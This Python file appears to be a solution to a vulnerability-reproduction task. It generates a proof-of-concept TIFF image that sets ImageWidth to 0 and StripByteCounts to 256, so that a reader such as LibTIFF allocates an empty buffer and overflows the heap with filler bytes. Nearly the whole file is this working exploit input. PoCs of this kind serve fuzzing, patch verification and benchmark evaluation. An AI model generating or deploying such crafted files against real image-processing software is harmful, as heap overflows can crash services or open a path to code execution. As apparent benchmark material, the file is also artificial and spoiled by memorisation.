import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to a Heap Buffer Overflow caused by zero width/height 
        images (typically in LibTIFF). Setting ImageWidth to 0 causes a buffer allocation 
        size of 0, while a non-zero StripByteCounts allows reading data into this 
        undersized buffer.
        """
        
        # Payload size for overflow (small to keep PoC compact, but sufficient for overflow)
        payload_size = 256

        # TIFF Header: Little Endian ('II'), Magic 42, Offset to IFD 8
        header = struct.pack('<2sH I', b'II', 42, 8)

        # IFD Entries
        # We construct a minimal valid TIFF with ImageWidth=0 to trigger the bug.
        # ImageLength=1 ensures processing loops are entered.
        entries = [
            (256, 3, 1, 0),             # ImageWidth (SHORT) = 0 [TRIGGER]
            (257, 3, 1, 1),             # ImageLength (SHORT) = 1
            (258, 3, 1, 8),             # BitsPerSample (SHORT) = 8
            (259, 3, 1, 1),             # Compression (SHORT) = 1 (None)
            (262, 3, 1, 1),             # PhotometricInterpretation (SHORT) = 1 (BlackIsZero)
            (273, 4, 1, 0),             # StripOffsets (LONG) - patched below
            (277, 3, 1, 1),             # SamplesPerPixel (SHORT) = 1
            (278, 3, 1, 1),             # RowsPerStrip (SHORT) = 1
            (279, 4, 1, payload_size),  # StripByteCounts (LONG) - amount to read/overflow
        ]

        # TIFF requires tags to be sorted in ascending order
        entries.sort(key=lambda x: x[0])

        num_entries = len(entries)
        # Size of IFD: count(2) + entries(12 * N) + next_offset(4)
        ifd_len = 2 + num_entries * 12 + 4
        
        # Calculate offset for the strip data
        # Offset = Header (8) + IFD length
        data_offset = 8 + ifd_len

        # Construct IFD bytes
        ifd = bytearray()
        ifd.extend(struct.pack('<H', num_entries))
        
        for tag, typ, cnt, val in entries:
            if tag == 273:  # Update StripOffsets to point to payload
                val = data_offset
            ifd.extend(struct.pack('<HHII', tag, typ, cnt, val))
        
        ifd.extend(struct.pack('<I', 0))  # Next IFD offset (0)

        # Payload data to overwrite the heap
        payload = b'A' * payload_size

        return header + ifd + payload